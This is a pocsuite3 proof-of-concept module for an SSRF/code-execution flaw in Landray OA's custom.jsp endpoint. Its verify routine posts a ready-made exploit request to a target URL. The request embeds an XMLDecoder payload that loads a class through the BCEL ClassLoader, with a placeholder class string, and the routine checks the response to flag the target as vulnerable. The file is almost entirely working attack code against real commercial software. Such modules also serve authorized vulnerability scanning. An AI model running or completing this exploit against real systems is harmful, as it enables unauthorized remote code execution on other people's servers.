from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '蓝凌 OA /sys/ui/extend/varkind/custom.jsp 存在SSRF漏洞'
    appName = '蓝凌 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''深圳市蓝凌软件股份有限公司 OA系统 /sys/ui/extend/varkind/custom.jsp 存在SSRF漏洞，攻击者可利用此漏洞获取服务器控制权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = "/sys/ui/extend/varkind/custom.jsp"
        data = 'var={"body":{"file":"/sys/search/sys_search_main/sysSearchMain.do?method=editParam"}}&fdParemNames=11&fdParameters=<java><void+class%3d"com.sun.org.apache.bcel.internal.util.ClassLoader"><void+method%3d"loadClass"><string>$$BCEL$$1234</string><void+method%3d"newInstance"></void></void></void></java>'
        vulurl = self.url+path
        resp = requests.post(url=vulurl, headers=headers, data=data, verify=False, allow_redirects=False, timeout=10)
        if resp.status_code == 200 and len(resp.content) >= 10000 and '您的请求已提交' in resp.text and '"icon": ["sys/ui/extend/theme/default/style/icon.css"],' in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulurl
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
